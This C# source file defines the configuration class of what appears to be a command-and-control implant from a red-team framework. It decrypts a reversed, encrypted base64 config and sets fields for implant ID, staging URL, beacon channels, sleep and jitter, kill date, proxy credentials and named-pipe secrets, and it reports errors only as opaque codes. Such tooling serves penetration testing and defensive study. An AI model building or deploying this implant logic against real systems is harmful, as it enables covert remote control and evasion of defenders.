using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;

internal class Config
{
    private static readonly Regex IMAGES_REGEX = new Regex("(?<=\")[^\"]*(?=\")|[^\" ]+", RegexOptions.Compiled);

    internal bool RetriesEnabled { get; set; }
    internal int RetryLimit { get; set; }
    internal int StageWaitTimeMillis { get; set; }
    internal string DomainCheck { get; set; }
    internal string ProxyUrl { get; set; }
    internal string ProxyUser { get; set; }
    internal string ProxyPassword { get; set; }
    internal string UserAgent { get; set; }
    internal string HttpReferrer { get; set; }
    internal string KillDate { get; set; }
    internal string UrlID { get; set; }
    internal Dictionary<string, string> StageCommsChannels { get; set; }
    internal Dictionary<string, string> BeaconCommsChannels { get; set; }
    internal List<string> URIs { get; set; }
    internal string ImplantId { get; set; }
    internal string StageUrl { get; set; }
    internal List<string> Images { get; set; }
    internal int BeaconSleepMillis { get; set; }
    internal double Jitter { get; set; }
    internal string Key { get; set; }
    internal string PipeName { get; set; }
    internal string PipeSecret { get; set; }
    internal string FCommFilePath { get; set; }

    public Config(string reversedBase64Config, string key)
    {
        var stringArray = reversedBase64Config.ToCharArray();
        Array.Reverse(stringArray);
        var encryptedBase64Config = new string(stringArray);
        var configString = Encryption.Decrypt(key, encryptedBase64Config);
        var decoded = Convert.FromBase64String(Encoding.UTF8.GetString(configString).TrimEnd('\0'));
        ParseConfigString(Encoding.UTF8.GetString(decoded));
    }

    public void Refresh(string configRefresh)
    {
        ParseConfigString(configRefresh);
    }

    private void ParseConfigString(string configString)
    {
#if DEBUG
        Program.STDOUT.WriteLine($"[*] Parsing config string: {configString}");
#endif
        var splitConfigString = configString.Split(';');
        if (splitConfigString.Length != GetType().GetProperties(BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public).Length)
        {
#if DEBUG
            Program.STDOUT.WriteLine(
                $"[-] Split config string has invalid length - expected {GetType().GetProperties(BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public).Length}, got {splitConfigString.Length}");
#endif
            throw new Exception("0x0008");
        }

        var i = 0;
        RetriesEnabled = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? RetriesEnabled : bool.Parse(splitConfigString[i - 1]);
        RetryLimit = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? RetryLimit : int.Parse(splitConfigString[i - 1]);
        StageWaitTimeMillis = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? StageWaitTimeMillis : int.Parse(splitConfigString[i - 1]);
        DomainCheck = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? DomainCheck : splitConfigString[i - 1];
        ProxyUrl = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? ProxyUrl : splitConfigString[i - 1];
        ProxyUser = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? ProxyUser : splitConfigString[i - 1];
        ProxyPassword = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? ProxyPassword : splitConfigString[i - 1];
        UserAgent = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? UserAgent : Encoding.UTF8.GetString(Convert.FromBase64String(splitConfigString[i - 1]));
        HttpReferrer = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? HttpReferrer : splitConfigString[i - 1];
        KillDate = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? KillDate : splitConfigString[i - 1];
        UrlID = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? UrlID : splitConfigString[i - 1];
        StageCommsChannels = string.IsNullOrWhiteSpace(splitConfigString[i++])
            ? StageCommsChannels
            : CreateChannelDict(splitConfigString[i - 1]);
        BeaconCommsChannels = string.IsNullOrWhiteSpace(splitConfigString[i++])
            ? BeaconCommsChannels
            : CreateChannelDict(splitConfigString[i - 1]);
        URIs = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? URIs : splitConfigString[i - 1].Split(',').ToList().Select(x => x.Trim()).ToList();
        ImplantId = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? ImplantId : splitConfigString[i - 1];
        StageUrl = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? StageUrl : splitConfigString[i - 1];
        Images = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? Images : ExtractImages(splitConfigString[i - 1]);
        BeaconSleepMillis = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? BeaconSleepMillis : ExtractBeacon(splitConfigString[i - 1]);
        Jitter = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? Jitter : ExtractJitter(splitConfigString[i - 1]);
        Key = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? Key : splitConfigString[i - 1];
        PipeName = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? PipeName : splitConfigString[i - 1];
        PipeSecret = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? PipeSecret : splitConfigString[i - 1];
        FCommFilePath = string.IsNullOrWhiteSpace(splitConfigString[i++]) ? FCommFilePath : splitConfigString[i - 1];
    }

    private static Dictionary<string, string> CreateChannelDict(string channelString)
    {
        return channelString.Split('#').ToDictionary(s => s.Split(',')[0], s => s.Split(',')[1]);
    }

    private static double ExtractJitter(string jitterString)
    {
        if (!double.TryParse(jitterString, NumberStyles.Any, CultureInfo.InvariantCulture, out var jitter))
        {
#if DEBUG
            Program.STDOUT.WriteLine($"[-] Unable to parse jitter as double: {jitterString} - setting to default of 0.2");
#endif
            jitter = 0.2;
        }

        if (!(jitter >= 1) && !(jitter < 0)) return jitter;
#if DEBUG
        Program.STDOUT.WriteLine($"[-] Invalid jitter value: {jitterString} - needs to be greater than 0 and less than 1 - setting to default of 0.2");
#endif
        jitter = 0.2;

        return jitter;
    }

    private int ExtractBeacon(string sleepString)
    {
        var sleep = Program.SLEEP_REGEX.Match(sleepString);
        if (sleep.Success)
        {
            return Utils.ParseSleepTimeMillis(sleep.Groups["t"].Value, sleep.Groups["u"].Value);
        }
#if DEBUG
        Program.STDOUT.WriteLine($"[-] Invalid beacon sleep value: {sleep.Value} - setting to default of 30s");
#endif
        return BeaconSleepMillis = 30000;
    }

    private static List<string> ExtractImages(string imagesString)
    {
        var imagesMatch = IMAGES_REGEX.Matches(imagesString.Replace(",", "")).Cast<Match>().Select(m => m.Value);
        imagesMatch = imagesMatch.Where(m => !string.IsNullOrEmpty(m));
        return imagesMatch.ToList();
    }

    public void SetCommsChannels(string newChannels)
    {
        BeaconCommsChannels = CreateChannelDict(newChannels);
    }
}